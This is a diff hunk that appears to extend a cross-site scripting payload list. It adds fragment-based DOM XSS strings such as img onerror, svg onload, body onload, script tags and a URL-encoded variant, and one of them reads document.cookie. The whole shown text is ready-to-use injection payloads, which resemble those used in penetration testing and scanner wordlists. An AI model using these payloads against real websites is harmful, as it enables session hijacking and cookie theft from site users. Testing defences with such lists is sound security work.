@@ -463,8 +463,14 @@ javascript:"/*'/*`/*\</script><svg/onload=alert(1)>/*</script> */ alert(1)//
 "><details open ontoggle=alert(1)>
 "><script>alert(1)</script>
 javascript:alert(1)
+#<img src=x onerror=alert(document.cookie)>
+#<body onload=alert(1)>
+#%3Cimg%20src=x%20onerror=alert(1)%3E
+#<svg onload=alert(1)>
 #"><img src=x onerror=alert(1)>
 '><img src=x onerror=alert(1)>
+#<script>alert(1)</script>
+#<img src=x onerror=print()>
 ;alert(1);//
 '-alert(1)-'
 ';alert(1);//
